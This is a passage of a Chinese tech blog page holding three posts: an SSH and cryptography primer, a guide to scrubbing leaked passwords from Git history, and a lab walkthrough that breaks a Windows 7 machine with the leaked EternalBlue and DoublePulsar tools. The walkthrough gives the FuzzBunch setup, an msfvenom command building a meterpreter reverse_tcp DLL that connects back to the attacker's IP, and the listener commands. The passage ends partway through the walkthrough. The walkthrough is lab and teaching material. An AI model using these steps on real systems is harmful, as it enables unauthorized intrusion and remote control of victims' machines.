<p>不知道大家有没有了解过SSL&#x2F;TLS的基本原理，SSH给人的感觉很像 SSL&#x2F;TLS，然而这两者还是有些差别的。下面咱就直接开始吧，不废话了。</p>
<p>[v_blue]注：本系列内容如无特殊说明，SSH均为SSH2，实现为OpenBSD的子项目OpenSSH[&#x2F;v_blue]</p>
<h1 id="背景知识，SSH协议需求，设计难点"><a href="#背景知识，SSH协议需求，设计难点" class="headerlink" title="背景知识，SSH协议需求，设计难点"></a>背景知识，SSH协议需求，设计难点</h1><h2 id="计算机网络背景知识"><a href="#计算机网络背景知识" class="headerlink" title="计算机网络背景知识"></a>计算机网络背景知识</h2><p>SSH不像https是在http基础上衍生出来的，所以这里我们无需像https一样再次介绍http，我们只需要知道，SSH是一个TCP之下的协议。</p>
<h3 id="SSH的版本"><a href="#SSH的版本" class="headerlink" title="SSH的版本"></a>SSH的版本</h3><p>SSH主要有SSH1和SSH2两个版本，二者互不兼容。此两者的设计思想是基本相同的， SSH2修复了在SSH1中的一些不安全的设计、新增加了一些算法的支持等等。</p>
<h3 id="SSH与TCP的关系"><a href="#SSH与TCP的关系" class="headerlink" title="SSH与TCP的关系"></a>SSH与TCP的关系</h3><p>我们先看这个图吧：</p>
<p><img src="/images/050717_1305_SSH1SSH1.jpg"></p>
<p>在计算机网络中，我们实际使用的是TCP&#x2F;IP的四层协议而不是OSI的七层（在一些情况下为了方便讲解我们会把这二者综合成五层协议）</p>
<p>简单地说，TCP 协议是传输层的两大协议之一，在网络分层模型中，TCP 被称为”传输层协议”，而 SSH被称为”应用层协议”。有很多常见的应用层协议是以 TCP 为基础的，比如”FTP、SMTP、POP、IMAP”等。</p>
<p>TCP 被称为”面向连接”的传输层协议。关于它的具体细节，<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E4%BC%A0%E8%BE%93%E6%8E%A7%E5%88%B6%E5%8D%8F%E8%AE%AE">咱就去看维基百科吧</a>，这玩意能写出来一本一千页的书。你只需知道：传输层主要有两个协议，分别是 TCP 和 UDP。TCP 是可靠的传输协议， TCP 协议能够确保报文的顺序。</p>
<p>[v_error]注意：更可靠是否就意味着UDP是不能用的？谁不喜欢可靠的东西嘛？其实不是这样的，TCP和UDP都有着不同的适用条件。大家可以自己思考下为什么这俩协议都是非常有用滴。[&#x2F;v_error]</p>
<h2 id="密码学背景知识"><a href="#密码学背景知识" class="headerlink" title="密码学背景知识"></a>密码学背景知识</h2><p>说道密码学，大家可能以为这玩意真的很高深，其实也确实是这样的；但是如果想要对密码学的一些技术有一些入门的了解，还是很简单的。这里我们就简单的介绍下密码学的一些”工具箱”，要不，下一篇都会看不懂的。</p>
<p>[v_blue]注意：为了防止概念混淆，我们统一把密码（也就是你登录某个账号时输入的那个东西）说成”口令”。[&#x2F;v_blue]</p>
<h3 id="加密、解密与密钥是什么？"><a href="#加密、解密与密钥是什么？" class="headerlink" title="加密、解密与密钥是什么？"></a>加密、解密与密钥是什么？</h3><p>加密就是<strong>把明文变成密文</strong>的过程，解密就是<strong>把密文变成明文</strong>的过程。此二者是互逆的，就好似减法是加法的逆运算一样。在加密和解密的过程中，需要一个”密钥”来参与数学运算，这个密钥就好像是你的钥匙一样。</p>
<h3 id="对称密码"><a href="#对称密码" class="headerlink" title="对称密码"></a>对称密码</h3><p>所谓对称密码（对称加密），就是<strong>加密和解密的时候使用同一个密钥</strong>。这个很好理解，就像你用WinRAR啥玩意压缩一个文件的时候设置了一个口令，解压缩的时候也要用这个密码才能成功提取文件一样，这个”口令”就相当于我们上面说的密钥。对称密码有两种不同的色剂，可以分为流密码、分组密码。</p>
<p>分组密码共有五种<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F">分组模式</a>，在这里就不提了否则又要严重跑题并且增加文章长度，感兴趣的可以去围观维基百科。</p>
<p>我们常用的对称密码有DES、3DES、AES、Blowfish、IDEA、RC5、RC6等。其中AES竞标时最后入围共有五种算法：Rijndael、Serpent、 Twofish、MARS 和RC6，最后Rijndael被选作AES。</p>
<h3 id="非对称密码"><a href="#非对称密码" class="headerlink" title="非对称密码"></a>非对称密码</h3><p>非对称密码（非对称加密）也被称作公钥密码，所谓”非对称”，意思就是<strong>加密和解密的时候使用不同的密钥</strong>，挺难理解的是吧，但是咱得说，这种非对称的想法可是密码学上最大的突破之一。</p>
<p>咱在这里只要知道，非对称密码有一组密钥，这组密钥中，<strong>公开的被称为公钥，私有的被称作私钥</strong>；使用公钥加密的文件只有使用对应的私钥才能解开；使用私钥加密（签名）的文件只有使用对应的公钥才能解开。理论上来说，每一对公钥和私钥之间有着严谨的数学关系，很难互相推导。但是吧，在目前的大部分实现中(RSA)，通过公钥推导出对应的私钥很难，但是通过私钥推公钥是很可能的。，感谢<a target="_blank" rel="noopener" href="https://twitter.com/GFW">jaehee~임재희</a>的指正，<code>openssl rsa -in privkey.pem -pubout</code></p>
<p>非对称密码中比较出名的有RSA和椭圆曲线（ECC）。</p>
<p>总结：对称密码和非对称密码的优缺点咱能看出来，对称密码的实现比较简单，但是能干的事情却没有公钥密码那么多；但是公钥密码的设计通常要涉及到一些比较复杂的数学问题，所以公钥密码的速度通常要比对称密码差几个数量级；并且，公钥密码需要比较长的密钥长度才能够保证类似等同于对称密码的加密强度，NIST的建议是，RSA和DSA是1024位，ECC是160位，相应的对称分组密码（比如说AES-CBC）的密钥长度是80位；或者说AES为128位、RSA 2048和ECC 256位。</p>
<h3 id="单向散列函数"><a href="#单向散列函数" class="headerlink" title="单向散列函数"></a>单向散列函数</h3><p>大家熟悉这个吗？</p>
<p><img src="/images/050717_1305_SSH1SSH2.png"></p>
<p>单向散列函数就相当于消息的指纹，指纹这东西嘛，就是接近独一无二的咯。咱把一个消息（文件）使用单向散列函数处理一下，就会有一个定长的”指纹”（也被称作散列值、摘要），我们就可以用这段摘要来唯一的代表这个消息；假如某天这个消息变化了哪怕是1比特，那么这个摘要也会变得面目全非，这样咱就能知道原来的消息被篡改了。</p>
<p>换句话说，单向散列函数可以用来验证消息的完整性。</p>
<p>咱常用的单向散列函数有MD5、SHA1等等。</p>
<h3 id="消息认证码"><a href="#消息认证码" class="headerlink" title="消息认证码"></a>消息认证码</h3><p>消息认证码就是一种能够<strong>确定消息的完整性并且能够进行认证</strong>的技术。所谓”完整性”、”一致性”，就是消息没有被篡改；所谓”认证”，就是消息来自正确的发送者。消息认证码是一种结合了<strong>单向散列函数和对称密码</strong>的密码学技术。我们常用的HMAC就是其中之一。</p>
<h3 id="数字签名"><a href="#数字签名" class="headerlink" title="数字签名"></a>数字签名</h3><p>前面我们提到了公钥和私钥。我们知道公钥是公开的、私钥是私有的，如果我们使用私钥对某个文件进行加密（实际上应该被称作签名），那么任何人都可以对此进行解密，看似这里似乎失去了加密的意义，但这实际上可以证明一点：只有持有私钥的人才能够进行加密，这也意味着我们可以<strong>认证、防止否认、完整性</strong>。</p>
<p>咱一般都是对消息的散列进行”签名”，因为公钥密码比较慢嘛。</p>
<h3 id="伪随机数"><a href="#伪随机数" class="headerlink" title="伪随机数"></a>伪随机数</h3><p>如果读者学习过某些程序设计语言，可能记得他们的标准库中都有个类似random的东西可以生成某个范围内的随机数。我们看那个随机数似乎是统计学上随机的，但实际上咱要认识到一件非常残酷的事实：计算机是无法生成真正的随机数的，所以我们称随机数算法为”伪随机数算法”。</p>
<p>这好像挺难理解的，咱只要知道吧，只要随机数算法是固定的，在给一个固定的”种子”，那么每次生成的随机数也就是固定的、有规律可循的。</p>
<p>那这随机数有啥用啊？还记得上面提到的密钥吗，在密码学中，随机数可是无处不在的。</p>
<p>随机数有一些比较重要的性质：<strong>随机性</strong>（不存在统计学偏差）、<strong>不可预测性</strong>（不能根据过去的随机数序列预测未来的随机数序列）、<strong>不可重现性</strong>（不能重现该序列），密码学上使用的伪随机数算法至少也要做到前两点。</p>
<p>咱要记得，凡是线性随余算法的随机数都不能作为密码学应用；请使用语言的标准库中提供的密码学算法，或者是使用OpenSSL、<code>/dev/random</code>这类安全的实现。</p>
<p>说了这么多密码学的工具，估计可能已经蒙圈了吧？别急，咱继续，接下来咱来分析下SSH设计的需求，这才是重头戏。</p>
<h2 id="SSH协议需求"><a href="#SSH协议需求" class="headerlink" title="SSH协议需求"></a>SSH协议需求</h2><h3 id="保密性（防止泄密）"><a href="#保密性（防止泄密）" class="headerlink" title="保密性（防止泄密）"></a>保密性（防止泄密）</h3><p>SSH 需要做到足够好的保密性。</p>
<p>SSH首先要能够对抗嗅探。所谓的”嗅探”，通俗而言就是监视你的网络传输流量。比如说某些网关设备啊，甚至是某些情况下开了混杂模式的网卡都可以轻而易举的嗅探到你的网络流量。如果你使用明文的协议，那么监视者通过嗅探，就知道你传输的内容，自然而然也就包括密码啦什么的。。</p>
<p>嗅探是比较低级的攻击手段了，下面咱会谈一种很变态的攻击手段：重放攻击。</p>
<h3 id="完整性（防止篡改）"><a href="#完整性（防止篡改）" class="headerlink" title="完整性（防止篡改）"></a>完整性（防止篡改）</h3><p>除了”保密性”，还有一个同样重要的目标是”确保完整性”。完整性就是协议会保证传输的内容是不能被篡改的。</p>
<p>如果换到HTTPS上的完整性，咱就想想那些http的页面被ISP插入的广告，而HTTPS却不会有ISP的广告，这样就好理解了。</p>
<p>在完整性中，有一种比较变态的手段叫做”<a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Replay_attack">重放攻击</a>“。举个栗子，假如某个攻击者监听了你的SSH会话，他将你执行某个命令（比如说rm –rf *）的报文记录下来，然后在你切换到~的时候插入这个报文，那么你就会错误的删除自己家目录下的所有文件。攻击者并没有解密你的通信，他的攻击之所以能够成功是因为发送的报文是真实有效的，而TCP的完整性校验是基于报文的，所以SSH必须要有一种有效的校验方式来抵抗这种攻击手法。</p>
<h3 id="真实性"><a href="#真实性" class="headerlink" title="真实性"></a>真实性</h3><p>我猜很多人都不会考虑到”真实性”，那么让我来问你一个问题，你怎么知道你访问的网站真的是目标网站而不是其他人仿冒的？看域名？别扯了域名系统本身就是不可靠的。</p>
<p>在SSH的设计中，也必须要通过某种手段来保证真实性的需求，当然了这里SSH的设计要比HTTPS的简单的多。</p>
<h3 id="转发（隧道）、可扩展性"><a href="#转发（隧道）、可扩展性" class="headerlink" title="转发（隧道）、可扩展性"></a>转发（隧道）、可扩展性</h3><p>咱把SSH设计出来，还有一个作用是可以像SSL&#x2F;TLS一样来作为”隧道”来保护、强化其他协议的安全性。所谓转发，就是在SSH会话中封装了其他的基于TCP的应用层协议，借此可以把SSH的安全特性应用到这个应用层协议上。</p>
<h3 id="高性能"><a href="#高性能" class="headerlink" title="高性能"></a>高性能</h3><p>咱谁都不喜欢性能低下的协议吧，毕竟加密、解密等过程中是存在性能开销的，如何设计SSH使得性能不至于太差也是至关重要的。所以SSH得关注于如何使用加密算法（对称or非对称）。</p>
<h2 id="SSH协议的设计难点"><a href="#SSH协议的设计难点" class="headerlink" title="SSH协议的设计难点"></a>SSH协议的设计难点</h2><p>类似SSL&#x2F;TLS，SSH的设计同样需要解决一些很蛋疼的问题，类比于SSL&#x2F;TLS, SSH中设计难点主要有：</p>
<h3 id="密钥交换"><a href="#密钥交换" class="headerlink" title="密钥交换"></a>密钥交换</h3><p>如果张三要和李四建立一个加密通信的信道，那么他们就要先约定好一个加密算法，然后交换一个密钥。在这种情况下，约定的算法被其他人知道是没关系的，但是密钥却不能被其他人得知，得到密钥等同于得到明文。</p>
<p>回到开头，加密通信建立起来之前，咱必须协商算法、交换密钥（这个过程一般被称作握手），可是加密通信还没建立了，握手过程中必然是明文的，咋安全的交换密钥啊？所以啊，<strong>如何在不安全的网络中安全的进行密钥交换</strong>，这大概是非常蛋疼的一个问题，也是设计中的一个难点。俺剧透一下，DH交换就挺不错的其实。</p>
<h3 id="服务器认证以及客户端认证"><a href="#服务器认证以及客户端认证" class="headerlink" title="服务器认证以及客户端认证"></a>服务器认证以及客户端认证</h3><p>不同于SSL&#x2F;TLS，SSH协议需要客户端认证服务器、服务器也需要认证客户端，换句话说，SSH的过程是双向认证。对服务器进行认证可以确保你连接到了正确的服务器而不是冒牌货、也就是防止中间人攻击；对客户进行认证，则被称作为“授权”更恰当，最简单单也最脆弱的则是通过密码实现的，还有一些比如使用公钥、kerberos等。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>说了这么多废话，来介绍密码学基础知识、SSH设计的需求和难点，是为了啥呢？因为只有当你了解这些，在后面介绍 SSH 的实现原理时，你才能更容易理解当初为啥要这么设计协议，这也就更方便理解why啦。</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/05/08/ssh-1/index/" data-id="clhp7rtk80090s2qrdwnp07h7" data-title="[SSH系列1]：什么是SSH、背景知识，SSH协议需求与设计难点" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-git-password/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/04/28/git-password/index/" class="article-date">
  <time class="dt-published" datetime="2017-04-28T00:00:00.000Z" itemprop="datePublished">2017-04-28</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/security/">security</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/04/28/git-password/index/">不小心把密码上传到GitHub了，怎么办</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <blockquote>
<p>辛辛苦苦写了个脚本，一个兴奋就给推送到GitHub了，然后才反应过来脚本里好像硬编码了帐号密码；根据某某SDK写了个客户端，一下子推送上去发现API Key忘了抹；更有甚者直接把SSHKey推送上去了……</p>
</blockquote>
<p>总之就是一不小心把敏感信息推到了版本控制的Git上，可能会马上反应过来，可能过了好几个月才反应过来，那该怎么办呢？本文就将讨论一下已经推送到GitHub之后几种比较可行的方式，希望大家伙都不会有必要读到此文，唉！（如果没推的话，amend啥的就好了）</p>
<p>天啊我真是太喜欢这首歌了，快来听听吧<del>irony, ironical, ironic，为了防止正在上课的小伙伴被抓到，我把主题的自动播放干掉了哈哈哈</del> :mrgreen: [netmusic id&#x3D;”31421442”]</p>
<h2 id="必须要做的后备措施"><a href="#必须要做的后备措施" class="headerlink" title="必须要做的后备措施"></a>必须要做的后备措施</h2><p>如果反应过来自己把敏感信息（尤其是帐号密码）推送到了GitHub上，尤其是很长时间之后才发现的，第一件要做的事情是更改掉对应的密码、尽可能的开启两步验证、作废API Key等必要的预备措施。因为我们无法得知究竟有多少人看过、克隆、复刻过仓库，也就无法评估危险等级，只能亡羊补牢了。</p>
<p>在说正确的方法之前，咱先说一说一个大错特错的方法</p>
<h2 id="错误方法一：修改代码中的敏感信息"><a href="#错误方法一：修改代码中的敏感信息" class="headerlink" title="错误方法一：修改代码中的敏感信息"></a>错误方法一：修改代码中的敏感信息</h2><p>很多人第一想法可能会是修改代码中的敏感信息，然后commit &amp; push。看似这样是解决了问题，但实际上问题依旧存在，这样做是大错特错的！为何？Git作为一个优秀的版本控制系统，其核心能力就是能够穿梭于每次历史记录（也就是commit），这样做实际上只是在最新的版本库中不存在敏感信息，只要咱checkout下自然就能看到有着敏感信息的那次commit，还有毛用嘛！ 类似的办法还有revert啥的，没用的！ <a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/201704281441265.png"><img src="/images/201704281441265.png"></a></p>
<h2 id="错误的方法二：置之不理"><a href="#错误的方法二：置之不理" class="headerlink" title="错误的方法二：置之不理"></a>错误的方法二：置之不理</h2><p>实际上这不算是一种方法，而是一种态度吧。如果你想成为一名优秀的程序员，那么注重细节、注重安全自然是比较珍贵的素质；同时我敢说大部分人都是一两个密码走天下、没有开启两步验证的，这样暴露密码极大地提高了撞库的机率，渗透的第一步搜集信息就得到了密码。 也许有人会反驳，谁没事干看我仓库读代码？或许真的没有人会无聊到这样，或许有了你也很难发现，但是请允许我介绍一种名为Gitrob的工具。人可能没那么无聊，但是机器可不怕无聊的工作，是吧。</p>
<p>下面咱来说说几个比较可行的方式吧！</p>
<h2 id="方法一：删库"><a href="#方法一：删库" class="headerlink" title="方法一：删库"></a>方法一：删库</h2><p>最简单的办法就是删库。确实简单粗暴，对于一些可有可无的仓库来说这应该是最好的处理方法了。对于那些比较珍贵的仓库，这个办法很显然是行不通的。</p>
<h2 id="方法二：通过临时仓库覆盖敏感信息"><a href="#方法二：通过临时仓库覆盖敏感信息" class="headerlink" title="方法二：通过临时仓库覆盖敏感信息"></a>方法二：通过临时仓库覆盖敏感信息</h2><p>思路很简单，备份仓库，在敏感信息之前的一次提交创建临时分支，删除有着敏感信息的分支，从临时分支创建新的默认分支，然后再push修改过的代码。如果使用GitHub，可能还需要把默认分支设置成临时分支。如果你使用的是比较方便的图形化Git客户端如Source Tree、GitKraken，那么这一步应该很容易，就不放图了…… 这个方法只适用于发现的比较快的、敏感信息之后commit不太多的仓库。如果敏感信息之后commit &amp; push了很多，这就不太方便了。</p>
<h2 id="方法三：使用git-filter-branch"><a href="#方法三：使用git-filter-branch" class="headerlink" title="方法三：使用git filter-branch"></a>方法三：使用<code>git filter-branch</code></h2><p><code>git filter-branch</code>的方法其实挺复杂的，而且不是那么方便，推荐大家还是用方法4吧，这个看看就够了。假如咱要从所有的历史记录中删除某个文件，其实就大概这么一句就差不多了</p>
<p>git filter-branch –force –index-filter ‘git rm –cached –ignore-unmatch sensitive-data.py’ –prune-empty –tag-name-filter cat – –all</p>
<p>这样那个文件的记录就没啦。咱再force push下，远程仓库的就和本地的一样啦。</p>
<p>git push origin –force –all</p>
<p>当然了，如果有必要的话，记得不带敏感信息的代码再推上去。</p>
<h2 id="方法四：使用专用工具BFG-Repo-Cleaner"><a href="#方法四：使用专用工具BFG-Repo-Cleaner" class="headerlink" title="方法四：使用专用工具BFG Repo-Cleaner"></a>方法四：使用专用工具BFG Repo-Cleaner</h2><p>咱能看出来上面的命令听复杂，参数很多，于是就有个兄弟写了个工具来一键解决咱们的问题。主页<a target="_blank" rel="noopener" href="https://rtyley.github.io/bfg-repo-cleaner/">在这</a>，估计大家都能看懂吧？我再简述一下，假如我的仓库名字为<code>python_test_code</code>，敏感文件的名字为<code>ygmail_test.py</code>的话，</p>
<p>java -jar bfg.jar  –delete-files ygmail_test.py python_test_code</p>
<p>大然后再看下，那么敏感文件就没了，然后再force push就行了~基本上不会有其他问题。</p>
<p>可是这样删除文件好像不太友好呢，有没有办法直接把敏感信息替换成其他内容啊？有啊！</p>
<p>先创建一个名为<code>password.txt</code>的文件，在其中一行一个输入你的敏感信息，比如说密码啦，邮箱啦，等等啦，然后运行这么一句(（如果要清除的内容带中文，记得编码为UTF-8哟）：</p>
<p>java -jar bfg.jar –replace-text password.txt python_test_code</p>
<p>话说这作者，嗯……我很喜欢，我运行完竟然给我来了一句：</p>
<blockquote>
<p>You can rewrite history in Git - don’t let Trump do it for real! Trump’s administration has lied consistently, to make people give up on ever being told the truth. Don’t give up: <a target="_blank" rel="noopener" href="https://www.aclu.org/">https://www.aclu.org/</a></p>
</blockquote>
<p>当然了，bfg的还可以删除那些仓库历史里的大文件。比如说咱以前上传了几个二进制大文件，然后又删掉再也不需要了，如果clone的话，那么这几个大文件也会跟着一起clone下来的其实。</p>
<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>俺才疏学浅，只能想到这么几种办法了，唉~！不要说我为啥要写这么一篇博文，泪啊！这事我都干了三次了，真是受不了自己的愚蠢了，也亲眼看着其他人干过……<strong>某个可爱的小童鞋，抽时间解决了这个安全问题吧。</strong></p>

      
    </div>
    <footer class="article-footer">
      <a data-url="http://example.com/2017/04/28/git-password/index/" data-id="clhp7rtgd0031s2qr5ssr3d6f" data-title="不小心把密码上传到GitHub了，怎么办" class="article-share-link"><span class="fa fa-share">Share</span></a>
      
      
      
    </footer>
  </div>
  
</article>



  
    <article id="post-shadowbroker/index" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2017/04/22/shadowbroker/index/" class="article-date">
  <time class="dt-published" datetime="2017-04-22T00:00:00.000Z" itemprop="datePublished">2017-04-22</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/justsay/">justsay</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2017/04/22/shadowbroker/index/">[ShadowBroker]1：NSA工具集EternalBlue + Doublepulsar + meterpreter渗透Windows 7/2008，兼谈Windows Server 2003中文版渗透</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <p>[v_error]警告： 本文仅供实验性研究，请勿用于非法用途，出啥事我不负责。真的！别算我头上，我胆小害怕。 好吧，如果这免责声明能管用的话……[&#x2F;v_error]</p>
<p>有个歪果仁写了一系列文章，蛮详细的，如果有兴趣的话可以戳去读一读吧：_<a target="_blank" rel="noopener" href="http://www.pwn3d.org/posts/1721872-from-git-clone-to-pwned-owning-windows-with-doublepulsar-and-eternalblue-part-1">From git clone to Pwned - Owning Windows with DoublePulsar and EternalBlue</a>_ </p>
<p>目前，某些特定版本的Windows 10也可以了，可以参见这个PR <a target="_blank" rel="noopener" href="https://github.com/rapid7/metasploit-framework/pull/9473">https://github.com/rapid7/metasploit-framework/pull/9473</a></p>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>几个星期之前Shadow Broker把NSA的黑客工具偷出来并公布了，据说这些工具非常强大，一个小毛孩都能拿着这些黑掉大半个瘟斗士……嗯，今天我这小毛孩跟你们说下，确实如此好吧。</p>
<p>本文我们将会集中讨论在Windows上使用EternalBlue来渗透Windows 7&#x2F;2008，然后使用插件Doublepulsar来注入dll。咱使用的工具是NSA的”metasploit”，名为”FuzzBunch”</p>
<h3 id="为啥选择EternalBlue"><a href="#为啥选择EternalBlue" class="headerlink" title="为啥选择EternalBlue"></a>为啥选择EternalBlue</h3><p>在NSA泄露的那对工具之中，EternalBlue是唯一一个能够攻击Windows 7和Windows Server 2008、并且不需要任何认证信息的工具；在expliot成功之后，我们使用Doublepulsar将我们制作的恶意dll注入系统进程中，从而拿到shell</p>
<h3 id="概念解释"><a href="#概念解释" class="headerlink" title="概念解释"></a>概念解释</h3><p><strong>exploit</strong>：就是用来触发漏洞的程序</p>
<p><strong>payload</strong>：就是触发漏洞之后执行的代码。如果exploit是火药的话，payload就是（具有杀伤力的）弹头</p>
<p><strong>framework</strong>：为了方便使用、测试、研究，人们把这么一大堆东西放到一起做成一个”框架”，咱可以在这一个框架里完成exploit、payload等操作，不用来回切换，嗯粗略理解就是个这么玩意。</p>
<h2 id="准备实验环境"><a href="#准备实验环境" class="headerlink" title="准备实验环境"></a>准备实验环境</h2><p>我们需要准备三台电脑，好吧，其实虚拟机就够了（记得设置成桥接）。并且这三台电脑要在同一局域网下，也就意味着能够互相ping通</p>
<h3 id="目标机、靶机：-Windows-7-x64-SP1：172-26-99-211"><a href="#目标机、靶机：-Windows-7-x64-SP1：172-26-99-211" class="headerlink" title="目标机、靶机： Windows 7 x64 SP1：172.26.99.211"></a>目标机、靶机： Windows 7 x64 SP1：172.26.99.211</h3><p>Windows 7、Windows server 2008在此作为我们的靶机，也就是受害者。我们啥也不需要知道，只要有个IP、能够ping通就好了。</p>
<p>感谢我室友那英勇就义的电脑啊！</p>
<h3 id="攻击机1-FuzzBunch（主要）：Windows-XP-SP3-172-26-97-206"><a href="#攻击机1-FuzzBunch（主要）：Windows-XP-SP3-172-26-97-206" class="headerlink" title="攻击机1 FuzzBunch（主要）：Windows XP SP3:172.26.97.206"></a>攻击机1 FuzzBunch（主要）：Windows XP SP3:172.26.97.206</h3><p>我们用XP来运行FuzzBunch。我猜没人想用wine吧？为啥用xp呢？xp比较小，在虚拟机中安装速度比较快，省时间，省硬盘，嗯……</p>
<h3 id="攻击机2-Metasploit（次要）：Kali-Linux-172-26-96-152"><a href="#攻击机2-Metasploit（次要）：Kali-Linux-172-26-96-152" class="headerlink" title="攻击机2 Metasploit（次要）：Kali Linux :172.26.96.152"></a>攻击机2 Metasploit（次要）：Kali Linux :172.26.96.152</h3><p>任何一个Linux发行版都可以，只要能够运行metasploit即可；如果实在不会用Linux，在Windows下使用metasploit也算可以吧。</p>
<p><a target="_blank" rel="noopener" href="https://www.rapid7.com/products/metasploit/download/">metasploit地址戳我</a></p>
<h2 id="准备工作"><a href="#准备工作" class="headerlink" title="准备工作"></a>准备工作</h2><p>正常来说，咱在做坏事之前，必然要先做一些搜集信息的工作，最常用的工具就是nmap啦！</p>
<p>咱使用nmap 来探测目标的信息，发现445简直就是福利。使用参数-O代表探测操作系统，-A代表all。</p>
<p><img src="/images/042217_1027_ShadowBroke1.png"></p>
<p>Target is all set, blow it! :wink: </p>
<h2 id="配置FuzzBunch"><a href="#配置FuzzBunch" class="headerlink" title="配置FuzzBunch"></a>配置FuzzBunch</h2><p>FuzzBunch需要Python2.6、旧版本的PyWin32</p>
<p>Python2.6：<a target="_blank" rel="noopener" href="https://www.python.org/download/releases/2.6/">https://www.python.org/download/releases/2.6/</a>（记得加到环境变量里）</p>
<p>PyWin32 v2.12：<a target="_blank" rel="noopener" href="https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/">https://sourceforge.net/projects/pywin32/files/pywin32/Build%20212/</a></p>
<p>当然还有这套工具了：<a target="_blank" rel="noopener" href="https://github.com/misterch0c/shadowbroker">https://github.com/misterch0c/shadowbroker</a></p>
<p>咱把这些东西都准备妥当了，然后编辑<code>windows/fb.py</code>，注释72行</p>
<p>大概就是如图所示：</p>
<p><img src="/images/042217_1027_ShadowBroke2.png"></p>
<p>之后再改FuzzBunch.xml，19和24行改成和你XP上一样的正确的路径。<img src="/images/042217_1027_ShadowBroke3.png"></p>
<p>之后我们切到对应的目录中，然后执行<code>python fb.py</code>，当当当！</p>
<p><img src="/images/042217_1027_ShadowBroke4.png"></p>
<p>默认的目标IP，就写我们的Windows 7咯，也就是172.26.99.211，下一个callback IP，就是XP的IP，然后Redirection输入no；</p>
<p><img src="/images/042217_1027_ShadowBroke5.png"></p>
<p>下一步，fz让我们给起个名字，由于我已经运行过了，所以就选择create a new project啦</p>
<p><a target="_blank" rel="noopener" href="https://dmesg.app/wp-content/uploads/2017/04/042217_1027_ShadowBroke6.png"><img src="/images/042217_1027_ShadowBroke6.png"></a></p>
<h2 id="使用EternalBlue攻击目标"><a href="#使用EternalBlue攻击目标" class="headerlink" title="使用EternalBlue攻击目标"></a>使用EternalBlue攻击目标</h2><p>第一步，咱要用EternalBlue来exploit目标，使用方法类似metasploit</p>
<p>use EternalBlue</p>
<p><img src="/images/042217_1027_ShadowBroke7.png"></p>
<p>啥都不管一直按回车使用默认值，除了在mode的时候选择2：FB</p>
<p><img src="/images/042217_1027_ShadowBroke8.png"></p>
<p>最后EternalBlue会问我们是否执行？直接回车吧。</p>
<p>如果不出意外的话，就应该成功了嗯……</p>
<p><img src="/images/042217_1027_ShadowBroke9.png"></p>
<p>当然要是出意外了，可能就会提示fail，咱要么<code>execute</code>再运行一下，要么就是目标机蓝屏啥了……嗯反正多试试吧。</p>
<h2 id="制作恶意dll"><a href="#制作恶意dll" class="headerlink" title="制作恶意dll"></a>制作恶意dll</h2><p>NSA的这堆exploit是很强大，但是payload感觉好像就弱了一些，像Doublepulsar能够注入dll、shellcode，好像没有metasploit那么强大哎？</p>
<p>没关系，咱用metasploit生成一个dll，交给Doublepulsar注入就好了。</p>
<p>在生成dll之前，咱首先要学习下metasploit中的meterpreter的几种类型：</p>
<p>meterpreter就是一个跨平台的shell，功能很强大，嘿嘿嘿。通常来说meterpreter有这么两种模式：正向和反向</p>
<p><strong>bind</strong>：攻击者连接目标机器的模式，通常比较适合内网渗透，有时会被防火墙拦下</p>
<p><strong>reverse</strong>：目标机连接攻击者的模式，基本上不会被防火墙阻拦。估计岁数大的小盆友们可能知道灰鸽子？这玩意就是反弹到攻击者的啦。</p>
<p>当然，这俩还能够细分为tcp、http、https，区别是啥，自己看帮助去！</p>
<p>这里咱就创建一个reverse_tcp啦。</p>
<p>需要注意的是，Doublepulsar要求比较多，64位的系统必须用64位的dll，32位的当然只能用32位的了，所以别搞错了。</p>
<p>咱直接打开终端，输入如下命令：</p>
<p>msfvenom -p windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp LHOST&#x3D;172.26.96.152 LPORT&#x3D;8089 -f dll &gt;reverse.dll</p>
<p>其中LHOST代表kali的IP地址，LPORT代表本地监听的地址（因为要反弹嘛），生成的文件名字为reverse.dll</p>
<p>我们只要简单的把这个dll拷贝到xp中即可。哎，咋拷贝最方便呢？没装虚拟机的辅助工具？没关系，在dll的存放目录下来一句<code>python –m SimpleHTTPServer 80</code></p>
<p>拿起XP里久违的IE6，访问kali的IP然后下载那个dll就好了嘛。</p>
<p>然后咱就让metasploit开启监听吧！</p>
<p>set PAYLOAD windows&#x2F;x64&#x2F;meterpreter&#x2F;reverse_tcp<br>use exploit&#x2F;multi&#x2F;handler<br>set lhost 172.26.96.152<br>set LPORT 8089<br>run</p>
<p><img src="/images/042217_1027_ShadowBroke10.png"></p>
<p>附录： 生成bind模式的meterpreter</p>
